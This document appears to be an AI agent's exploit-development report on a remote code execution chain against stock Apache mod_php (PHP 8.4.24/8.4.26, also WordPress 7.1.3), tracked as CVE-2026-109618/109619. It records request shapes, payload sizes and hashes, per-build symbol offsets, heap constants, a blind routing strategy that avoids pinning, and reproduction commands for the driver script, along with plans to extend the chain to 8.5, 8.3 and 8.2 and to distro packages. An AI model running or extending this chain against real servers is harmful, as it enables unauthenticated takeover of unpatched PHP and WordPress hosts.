# Universal stock mod_php chain — CVE-2026-109618/109619 (mod_php / prefork lane)

Run dir: `/tmp/opencode/research/modphp_109619_20261023T010232Z`
Date: 2026-10-23.  All tests: stock Apache prefork + mod_php, stock `php.ini-production`
(`display_errors=Off`, `memory_limit=128M`, `post_max_size=8M`), ASLR on, multi-worker,
**no pinning**, no target-config change, pure HTTP.

## 1. Verdict

| Build (vehicle) | A1 (END-cleanup OOM) | B1 (OOB leak) | A2+B2 (RCE) | Proof |
|---|---|---|---|---|
| **8.4.24** (`php:8.4.24-apache`, upstream 8.4.24 source) | **YES** `sc=1`, `status=2`, `idoff=-0x4c9000` | **YES** 819,208 B decoded, main bucket 87 | **YES** | `/out/p1_conc_M8424S1` → `uid=33(www-data)` + `M8424S1` |
| **8.4.26** (`php:8.4.26-apache`, two containers) | YES (same body as 8.4.24) | YES 819,208 B | **YES** (broadcast and single routes) | `/out/p1_a1` (`SINGLE1_b5`), `/out/p1_conc_CONC1` |
| **WP 7.1.3** on 8.4.26 (`wp-content/index.php`) | YES | YES | **YES** | `/out/p1_conc_WP713` → `uid=33(www-data)` + `WP713` |
| **8.5.11** (`php:8.5.11-apache`) | YES (`sc=1`, id 32 chars @ chunk+0x1FD300) with `mk_a1b --big 78 --big-name-len 32 --tail 12` | **PARTIAL** — 8,200 B decoded, **no libphp/main pointers** (only 0x40-spaced bin-64 free slots) | blocked (no `main`, no `S`) | — |
| **8.3.6** (real Ubuntu 24.04 package `8.3.6-0ubuntu0.24.04.13`) | **NO OOM at all** (HTTP 200, parts 860→1060) | no leak | — | — (see §6: **package is patched**) |
| **8.3.35** (`php:8.3.35-apache`) | blocked: default body OOMs **during parse** (500, no state); parts 859 → 200 no OOM | — | — | — |
| **8.2.34** (`php:8.2.34-apache`) | blocked, same as 8.3.35 | — | — | — |
| **8.4.27** (control) | 200 OK, no OOM | normal 40-B cookie | — | clean |
| **8.5.12** (control) | 200 OK, no OOM | normal 40-B cookie | — | clean |

**The universal part is real for the 8.4.x line:** one A1 body, one B1 body, one S offset
(`main+0xF8398`), one bucket fingerprint (87), across 8.4.24 and 8.4.26, minimal endpoint
and WordPress 7.1.3, on stock config with ASLR and prefork. Per build only three symbol
offsets change (`zif_system`, `zval_ptr_dtor`), read directly from the target `libphp.so`.

## 2. Confirmed universal components (8.4.24 = 8.4.26)

Bodies (identical bytes for both builds):

- A1: 1,060,211 B, `sha256 8e8fc166e6b326d20bb7611d8ef3cee3bd5da46447985312c1492ab0a44d1eb6`
  (`mk_a1.py --big 78`, defaults: parts 860, depth 64, big 78, 20 burners 4000 B,
  progress 4000 B), sent **chunked** to
  `POST /index.php?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v`.
- B1: 33,128,677 B, `sha256 b6c547e0e9a2bb26607df1521de96f4d5c9adf4621c28b7ab491587b21ae40f2`
  (`mk_leak_b.py --spec "G:511:0x137"×14,G:400:0x137,G:511:0x137,X:900 --fake-len 0xC8000`, chunked to `POST /index.php`).
- A2: 279,369 B, `sha256 7af66c8f35c5fa6b47a539da6dca361d19543d9f62d61e4af891c2802bd5e236`
  (`cheap_oom_a.py --parts 880 --depth 64 --fillers 115`, Content-Length).
- B2: 451,384 B, fake-ref spray + fake `zend_array` (`vl=384, rc=1, type=0x0107,
  ref@+8 step 32, n1=500, ht, PHPSESSID, PROGRESS, n2=495`).

Derived constants (identical on 8.4.24 and 8.4.26):

| constant | 8.4.24 | 8.4.26 |
|---|---|---|
| `zif_system` = lib + | `0x464530` | `0x465370` |
| `zval_ptr_dtor` = lib + | `0x65d1e0` | `0x65eb60` |
| `S` = main + | `0xF8398` | `0xF8398` |
| main-chunk bucket count | 87 | 87 |
| A1 id offset / page | `-0x4C9000` (page 0x137) | `-0x4C9000` (page 0x137) |

`readelf -sW libphp.so` on 8.4.24 gives exactly `0x464530 zif_system`, `0x65d1e0 zval_ptr_dtor`;
8.4.26 gives `0x465370` / `0x65eb60`. The leak window is a constant 819,208 B on both.

## 3. Routing result (matters for "no pinning")

Blind tests on a **5-child** fresh container (m109-8426, 8.4.26):

- **Broadcast** A2 (5×) then B2 (5×): A2 500s on all 5 children; every B2 hit a primed child,
  all returned 0 B (child died) **but no proof** — 0/4 attempts. All primed children are
  mutually polluted; first B2 contact crashes before the fake-dtor path completes.
- **Single-A2 blind rotation** (one A2, then B2 ×8, no holder/pinning connections):
  B2 i=0..4 returned normal 259-B responses, i=5 died **and wrote the proof** — 1/1.
  This is the same blind pattern the 9bie addendum used for WordPress (6/6).
- On the older 9bie container (6-child pool) broadcast fired on the first B2 (1/1), consistent
  with the prior 5/5 report: the failure mode is child-pool-size/priming interaction, not the body.

Cold vs warm (minimal endpoint, 8.4.26):

- Cold (fresh restart): chain works (single route 1/1; broadcast 1/1 on the 6-child container).
- **Warm (no restart): 0/1** — A1 returned, but all 5 sequential B1 probes missed
  (no child held the dangling `PS(id)`); the A1 geometry needs a fresh worker generation.
  This reproduces the earlier warm result and is reported as a limitation, not a workaround.

## 4. Raw request shapes

```
A1  POST /index.php?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v HTTP/1.1
    Host: 127.0.0.1:PORT
    Content-Type: multipart/form-data; boundary=CCCCCCCCCC
    Transfer-Encoding: chunked
    Connection: close
    <1,060,211-byte body>

B1  POST /index.php HTTP/1.1   (same chunked headers, 33,128,677-byte body)

A2  POST /index.php HTTP/1.1
    Content-Type: multipart/form-data; boundary=CCCCCCCCCC
    Content-Length: 279369

B2  POST /index.php HTTP/1.1
    Content-Type: multipart/form-data; boundary=CCCCCCCCCC
    Content-Length: 451384
```

Chunked + no `Content-Length` keeps `SG(request_info).content_length = 0`, so the
`post_max_size` gate is skipped for A1/B1 (stock 8M limit, no config change).

## 5. Per-version evidence

### 8.4.24 (official `php:8.4.24-apache`, Debian-based upstream 8.4.24 source build)
- A1 probe (gdb, `probe_state.py`): `send_cookie=1`, `status=2`, `idlen=0x20`,
  `idoff=-0x4c9000` — byte-for-byte the 8.4.26 behavior.
- Full chain: `docker restart m109-8424` then A1 → 5×B1 (leak at i=3, main `…0x7f85c5600000`,
  candidates 87/79) → A2 → B2 (single route). `result.json`: `success=true`,
  proof `/out/p1_conc_M8424S1`:
  `uid=33(www-data) gid=33(www-data) groups=33(www-data)` + `M8424S1`.
- Result dir: `out/8424_single1/`.

### 8.4.26 (official `php:8.4.26-apache`, two independent containers)
- m109-8426 single route: leak i=4 → `S=main+0xF8398` → proof `/out/p1_a1`
  (`uid=33(www-data)` + `SINGLE1_b5`), `out/8426_single1/result.json`.
- p2s-mw-18610 broadcast: proof `/out/p1_conc_CONC1` (`uid=33(www-data)` + `CONC1`),
  `out/conc_18610/result.json`.
- Canonical pinned run as a **diagnostic only** (holder connections, explicitly not the claimed
  solution): `out/p1_exp_diag` = `uid=33(www-data)` + `DIAG` on m109-8426.

### 8.5.11 (official `php:8.5.11-apache`)
- A1 solved with `mk_a1b.py --big 78 --big-name-len 32 --tail 12`:
  1,063,865 B, `sha256 ba775359c5c759b15c27d4ed1ac67ff7e412b6991ca995f1adc7c5f03e003a77`;
  gdb: OOM in `php_url_encode`, `send_cookie=1`, id 32 chars at chunk offset `0x1FD300`.
- B1: 33,399,541 B, `sha256 33cd6b09cc0efd57425cbac38dd03b8418e9a2d7b6507786230f5a8f3101a1f9`
  (`mk_leak_b2.py` with 16×`T:0x1fd300` + `X:900`). Leak fires reliably at the last rotation
  slot (i=4 of 6 in `out/8511_probe6`): 10,225-B response, **8,200 B decoded**, but the
  decoded window contains only 0x40-spaced bin-64 free-slot pointers — **no `zval_ptr_dtor`,
  no main-chunk bucket**. Without `main` there is no `S`, and without `lib` no `zif_system`;
  A2/B2 cannot be attempted. Blocked at B1 quality (id page `0x1FD300` leaves only 0x2D00 B
  of usable window).
- Unverified constants (from the 8.5.11 `libphp.so`, not exercised end-to-end):
  `zif_system=lib+0x5996e0`, `zval_ptr_dtor=lib+0x7b47a0`.

### 8.3.35 / 8.2.34 (official `php:8.3.35-apache`, `php:8.2.34-apache`)
- Default A1 body → **500 during parse** (`status=1`-class, no dangling state), so B1 misses
  (`out/8335_default`, `out/8234_default`).
- 8.3.35 `--parts 859 --big 78` → 200 OK, **no OOM**, no leak (`out/8335_859`).
- No END-cleanup OOM found for the 8.3/8.2 line with the 8.4 shapes: the parse peak hits the
  limit before the END cleanup gets its page. Same body at parts 1060 OOMs on 8.3.35/8.4.26 but
  the failure is still at parse time (no `send_cookie=1` state). Blocked; needs an
  8.3-specific END-phase groom (open item).

### 8.3.6 — real Ubuntu 24.04 stock (package `php8.3 8.3.6-0ubuntu0.24.04.13`)
- Container built from `ubuntu:24.04` + `apache2 libapache2-mod-php8.3` (stock distro ini,
  prefork, `output_buffering=4096`, `display_errors=Off`, 128M), minimal `<?php echo "OK\n"; ?>`.
- A1 with the 8.4 body: **HTTP 200 at parts 860, 870, 880, 890, 900, 910, 950, 1000, 1030, 1060**
  — no OOM, no 500, no dangling state; B1 never leaks (normal 34-B cookie). Same body OOMs
  (500) on 8.3.35 and 8.4.26 at parts 1060, so the body shape is live.
- **Root cause: the package is already patched.** `/usr/share/doc/php8.3-common/changelog.Debian.gz`
  for `8.3.6-0ubuntu0.24.04.13` states:
  `SECURITY UPDATE: Remote RCE via state corruption issue — debian/patches/CVE-2026-109618_109619.patch`
  and lists `CVE-2026-109618`, `CVE-2026-109619`.
  So this exact archive revision is a **fixed control**, not a vulnerable target. The vulnerable
  Ubuntu revision is the pre-`.13` package (e.g. `8.3.6-0ubuntu0.24.04.1`), which the current
  archive no longer serves.

## 6. Distro-status note (Debian 13 / Ubuntu 24.04)

- Ubuntu 24.04 `php8.3 8.3.6-0ubuntu0.24.04.13`: **patched** (changelog above) → clean control.
- Debian 13: the local archive has `php8.4-common 8.4.26-1~deb13u1` and `php8.4-cli/fpm 8.4.27-1~deb13u1`;
  the current `libapache2-mod-php8.4` stream is 8.4.27 (fixed). The vulnerable Debian 13 build
  (8.4.24) is a snapshot-only package.
- Therefore the vulnerable "Debian 13 / Ubuntu 24.04 stock mod_php" vehicle used here is the
  upstream 8.4.24 source build (`php:8.4.24-apache`, stock production ini) — same upstream code
  as the distro build before the distro backport. The chain works on it **without any
  version-specific A1/B1/S change** (only symbol offsets). Claiming the distro *package* 8.4.24
  itself would require installing `libapache2-mod-php8.4 8.4.24-1` from snapshot.debian.org and
  re-running this same matrix (not done here).

## 7. WordPress 7.1.3 control

- Target file: stock WP `wp-content/index.php` (`<?php // Silence is golden.`) inside a real
  WordPress 7.1.3 tree (`p2s-wp-min-18622`; the front page needs a DB and returns 500 there,
  the tree/file are genuine WP 7.1.3; `p2s-wp-18620` serves the working 7.1.3 front, 301).
- Same 8.4.26 bodies, A1 query path + B1 on `/wp-content/index.php`, single-A2 blind route:
  B1 leak at i=4, main 87-bucket, `S=main+0xF8398`, proof `/out/p1_conc_WP713`:
  `uid=33(www-data) gid=33(www-data) groups=33(www-data)` + `WP713`.
- No application logic is used: engine-level only.

## 8. Fixed controls

8.4.27 and 8.5.12, same A1/B1 files: A1 = HTTP 200 (no OOM), B1 = normal 40-B cookie,
no heap leak (`out/8427_ctrl`, `out/8512_ctrl`). The fixed builds do not leave the
`send_cookie=1` dangling state.

## 9. Crash / availability

- Every successful chain ends with **one SIGSEGV post-exploitation** (the fake destructor);
  the B2 HTTP response is 0 B / connection closed while the proof is already on disk.
  Apache respawns the child; `GET /index.php` returns 200 immediately after each run on
  8.4.24/8.4.26/controls. No ASAN builds were used (stock targets); no pre-exploitation crash.
- Broadcast A2 leaves up to N primed workers that can abort on later requests; the single-A2
  route is the lower-collateral and more reliable blind choice on a 5-child pool.

## 10. Standing blockers / next steps

1. **8.5.11**: B1 must leak `zval_ptr_dtor` and a main chunk inside the remaining window.
   Options: lower id page (different BIG/tail), larger `fake_len` crossing the 2 MB boundary
   (SIGSEGV risk), or a `G:…` spec that lands the residual in a page containing libphp pointers.
   Then calibrate the 8.5.11 A2 (`hsv` offset) and `S`; A1 is already solved.
2. **8.3.35 / 8.2.34 / unpatched 8.3.6**: find an END-cleanup OOM that fires *after* a successful
   parse (the 8.4 shape hits the limit during parse). Direction: reduce parts below the parse
   boundary and add end-phase bin pressure (`--tail`, `--big-name-len`, `--nest-key-len`) so the
   `php_url_encode`/session-init allocation asks for a new page at the chunk limit.
3. **True distro packages**: fetch snapshot `libapache2-mod-php8.4 8.4.24` (Debian 13) and
   `php8.3 8.3.6-0ubuntu0.24.04.1` (Ubuntu) to confirm package builds behave like the upstream
   8.4.24 source build (expected: identical A1/B1/S, own symbol offsets).
4. **plain_full builds** (`/tmp/opencode/research/plain_full_8x_20261023T011800Z/bin/{8.5.11,8.3.35,8.2.34,8.5.12}`,
   libphp.so available) are the designated vehicles for the next round; this lane used the
   official `php:<ver>-apache` stock builds (same upstream sources). Re-verify the A1 id page
   and `S` on those `.so` before claiming transfer; 8.5.12 is the fixed control.
5. Warm-worker reliability remains 0/1 on the minimal endpoint (A1 needs a fresh worker
   generation); a real target that has served traffic may not expose a clean A1 child.

## 11. Reproduction commands

```bash
W=/tmp/opencode/research/modphp_109619_20261023T010232Z
# 8.4.24 (container m109-8424, port 18707)
python3 $W/scripts/chain_conc.py --port 18707 --container m109-8424 \
  --a1 $W/work/a1_8426.bin --b1 $W/work/b1_8426.bin --n 5 \
  --zif-off 0x464530 --zdtor-off 0x65d1e0 --s-off 0xF8398 \
  --marker M8424S1 --outdir $W/out/8424_single1 --restart --route single
# 8.4.26 (container m109-8426, port 18701)
python3 $W/scripts/chain_conc.py --port 18701 --container m109-8426 \
  --a1 $W/work/a1_8426.bin --b1 $W/work/b1_8426.bin --n 5 \
  --zif-off 0x465370 --zdtor-off 0x65EB60 --s-off 0xF8398 \
  --marker SINGLE1 --outdir $W/out/8426_single1 --restart --route single
# WordPress 7.1.3 (container p2s-wp-min-18622, port 18622)
python3 $W/scripts/chain_conc.py --port 18622 --container p2s-wp-min-18622 \
  --a1 $W/work/a1_8426.bin --b1 $W/work/b1_8426.bin --n 5 \
  --zif-off 0x465370 --zdtor-off 0x65EB60 --s-off 0xF8398 \
  --marker WP713 --outdir $W/out/wp713 --restart --route single \
  --path /wp-content/index.php
# fixed controls
python3 $W/scripts/probe_leak.py --container m109-8427 --port 18705 \
  --a1 $W/work/a1_8426.bin --b1 $W/work/b1_8426.bin --n 3 --outdir $W/out/8427_ctrl
python3 $W/scripts/probe_leak.py --container m109-8512 --port 18706 \
  --a1 $W/work/a1_8511_t12.bin --b1 $W/work/b1_8426.bin --n 3 --outdir $W/out/8512_ctrl
```

## 12. Artifact index

- `out/8424_single1/result.json` — 8.4.24 full chain, proof `p1_conc_M8424S1`
- `out/8426_single1/result.json` — 8.4.26 full chain (single route), proof `p1_a1`
- `out/conc_18610/result.json` — 8.4.26 full chain (broadcast, 9bie container), proof `p1_conc_CONC1`
- `out/wp713/result.json` — WordPress 7.1.3 control, proof `p1_conc_WP713`
- `out/8427_ctrl/`, `out/8512_ctrl/` — fixed controls (no leak)
- `out/8511_probe6/` — 8.5.11 A1 + B1 leak (8,200 B decoded, no pointers)
- `out/8335_default/`, `out/8335_859/`, `out/8234_default/` — 8.3.35/8.2.34 A1 blockers
- `out/836_*` — Ubuntu 8.3.6 A1 grid (all 200 OK; package patched)
- `out/8426_warm1/` — warm-worker attempt (A1 no priming, no leak)
- `scripts/chain_conc.py` — parameterized blind driver (`--route broadcast|single`, `--path`,
  `--zif-off/--zdtor-off/--s-off`)
- `scripts/probe_leak.py` — gdb-free A1+B1 leak probe
- `scripts/diag_children.py`, `scripts/dump_state.gdb` — per-child PS/heap diagnostic
- `/tmp/opencode/research/9bie_fullchain_multiw_20261022T130520Z/report.md` — mechanism,
  leak spec and prior 5/5 + 4/4 evidence this lane builds on

## 8.5 chain re-test (2026-10-23 08:40 UTC) — sparse leak is the real blocker

B1 artifact corrected: the old 8.5 B1 forged `len=0x2000`; decoded leak was
`0x2000+8=8,200` B. Re-forging the proven 8.5 layout (508-page fills, fake
zend_string header at chunk+0x1FD300 -> spec page 0x1FD, i.e. the header bytes
at value offset 0x1FC2E8) with `len=0xC8000` yields `0xC8008 = 819,208` B,
identical to the 8.4 window.

| build | A1 | B1 leak | decoded | pointers | 2MiB cluster |
|---|---|---|---|---|---|
| 8.5.0 | 500 (210 B) | 200 | **819,208** | 53 | 51 @ +0x1FD380, stride 0x40 |
| 8.5.5 | 500 (210 B) | 200 | **819,208** | 53 | 51 @ +0x1FD380, stride 0x40 |
| 8.5.11 | 500 (211 B) | 200 | **819,208** | 53 | 51 @ +0x1FD380, stride 0x40 |

Bodies: A1 `work/a1_8511_t12.bin` 1,063,865 B (mk_a1b --big 78 --big-name-len 32
--tail 12); B1 `work/b1_8511_G2.bin` 33,399,541 B (8.5 G-layout, 16x508-page
fills, forged len 0xC8000). No-pin broadcast failed (0/3: A1 and B1 land on
different children); diagnostic pinning (149 holders, 151 children) hit on the
first B1 every time, proving same-child requirement is unchanged.

Leak content (all three builds, identical signature):
- 53 qword pointers in [0x7f0000000000,0x800000000000)
- 51 of them = one 2 MiB ZendMM chunk, values chunk+0x1FD380 + k*0x40 (bin-64
  free list), plus 2 outliers that are themselves 2 MiB-aligned chunk bases
  (-0x200000 and +0x600000).
- **Zero libphp text/code pointers**: no value is base+rva code (all are
  aligned chunk bases or intra-chunk heap links). 8.4 control window had
  8,756 pointers including `zval_ptr_dtor`, which is what `parse_leak` uses to
  recover the libphp base. On 8.5 `parse_leak` therefore fails with
  `no_main`/bogus `lib` (only heap pointers exist).

Consequences for the chain:
- libphp base (hence `zif_system = lib + 0x5996e0`, `zval_ptr_dtor = lib +
  0x7b47a0`) is not recoverable from the leak -> the blind B2 cannot be built.
- The S anchor (8.4: `main_bucket + 0xF8398`) has no equivalent: only the id
  chunk (count 51) exists, and it is also the id bucket that 8.4 logic
  excludes; there is no second main bucket.
- A2/B2 cannot be reached blind. A diagnostic run with a `/proc/<pid>/maps`
  libphp base and an S-anchor sweep is the only way to test heap usability,
  and that would not constitute a blind 8.5 result.

Verdict: the 8,200 B blocker is explained and removed (body artifact), but 8.5
is **still blocked — by leak sparsity**: 53 heap-only pointers vs 8.4's 8,756
with code pointers. The 819,208 B window is uniform across 8.5.0/8.5.5/8.5.11,
so this is a 8.5-series heap-shape property, not a per-build defect.
Offsets confirmed per build (nm): 8.5.0 zif=0x56a420/zdtor=0x781fe0;
8.5.5 zif=0x570de0/zdtor=0x789ae0; 8.5.11 zif=0x5996e0/zdtor=0x7b47a0.
